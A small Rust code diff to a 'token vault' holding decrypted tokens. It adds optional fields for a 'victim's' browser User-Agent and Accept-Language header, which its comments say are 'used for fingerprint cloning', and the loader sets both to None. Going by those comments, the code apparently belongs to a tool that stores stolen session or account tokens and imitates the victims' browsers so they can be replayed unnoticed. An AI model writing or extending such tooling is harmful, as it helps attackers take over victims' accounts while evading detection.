@@ -26,6 +26,10 @@ pub struct DecryptedToken {
     pub created_at: DateTime<Utc>,
     pub last_refreshed_at: Option<DateTime<Utc>>,
     pub account_type: Option<String>,
+    /// Victim's browser User-Agent — used for fingerprint cloning
+    pub user_agent: Option<String>,
+    /// Victim's Accept-Language header — used for fingerprint cloning
+    pub accept_language: Option<String>,
 }
 
 /// Token vault using AES-256-GCM with per-entry PBKDF2-derived keys.
@@ -197,6 +201,8 @@ impl Vault {
             created_at: row.created_at,
             last_refreshed_at: row.last_refreshed_at,
             account_type: row.account_type,
+            user_agent: None,
+            accept_language: None,
         })
     }
 
